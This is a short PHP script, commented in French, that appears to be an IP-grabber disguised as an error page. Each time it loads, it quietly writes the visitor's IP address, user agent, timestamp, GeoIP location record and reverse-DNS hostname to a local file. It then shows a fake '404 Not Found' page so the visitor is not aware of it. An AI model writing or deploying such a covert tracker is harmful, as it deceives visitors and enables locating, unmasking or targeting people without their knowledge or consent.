<?php

$user_ip = 'Ip Adress : ' . $_SERVER['REMOTE_ADDR'] . "\r\n";
$user_useragent = 'User Agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
$user_clickdate = date('d-m-Y H:i:s') . "\r\n";
$user_country = 'Pays : ' . geoip_country_name_by_name($_SERVER['REMOTE_ADDR']) . "\r\n";
$user_record = geoip_record_by_name($_SERVER['REMOTE_ADDR']);
$user_fai = 'FAI : ' . gethostbyaddr($_SERVER['REMOTE_ADDR']) . "\r\n";

// Ecriture dans le fichier info.txt des infos

$stockInfo = fopen('info.txt', 'a+');

fputs($stockInfo, $user_ip);
fputs($stockInfo, $user_useragent);
fputs($stockInfo, $user_clickdate);
fputs($stockInfo, $user_fai);
foreach($user_record as $i => $value)
	{
		fputs($stockInfo, $i . ': ' . $value . "\r\n");
	}	
fputs($stockInfo,'-----------------' . "\r\n");
fclose($stockInfo);
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <title>404 Not Found</title>
  <style type="text/css">
  	.page {
    display: -webkit-box;
    display: -ms-flexbox;
    display: flex;
    min-height: 100vh;
		}
	.main {
    -webkit-box-flex: 1;
    -ms-flex: 1 1 70%;
    flex: 1 1 70%;
    box-sizing: border-box;
    padding: 10rem 5rem 5rem;
    min-height: 100vh;
		}
	.error-code {
    color: #f47755;
    font-size: 8rem;
    line-height: 1;
		}
	p.lead {
    font-size: 1.6rem;
    color: #4f5a64;
		}
  </style>
</head>
<body>
<div class="page">
  <div class="main">
    <h1>Server Error</h1>
    <div class="error-code">404</div>
    <h2>Page Not Found</h2>
    <p class="lead">This page either doesn't exist, or it moved somewhere else.</p>
    <hr/>
</div>
</body>

